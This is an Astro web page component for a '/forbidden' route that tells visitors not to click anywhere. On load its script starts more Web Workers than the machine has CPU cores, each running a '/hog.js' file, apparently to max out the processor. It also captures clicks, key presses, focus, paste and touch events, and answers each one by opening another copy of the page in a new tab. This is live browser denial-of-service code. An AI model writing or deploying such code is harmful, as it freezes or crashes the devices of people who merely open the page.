---
import BaseLayout from "../layouts/BaseLayout.astro";
import DontClick from "../layouts/DontClick.astro";
---

<BaseLayout>
    <h1>You shouldn't be here.</h1>
    <p>Don't click anywhere.</p>
    <DontClick />
</BaseLayout>

<script>
    const userEvents = [
        "click",
        "dblclick",
        "mousedown",
        "mouseup",
        "keydown",
        "keyup",
        "keypress",
        "contextmenu",
        "submit",
        "focus",
        "blur",
        "input",
        "change",
        "select",
        "copy",
        "cut",
        "paste",
        "touchstart",
        "touchend",
        "touchcancel",
    ];
    function duplicate(e: Event) {
        e.preventDefault();
        window.open("/forbidden", "_blank");
    }

    for (const _ of Array(window.navigator.hardwareConcurrency + 2).keys())
        new Worker("/hog.js");
    for (const e of userEvents) document.addEventListener(e, duplicate);
</script>
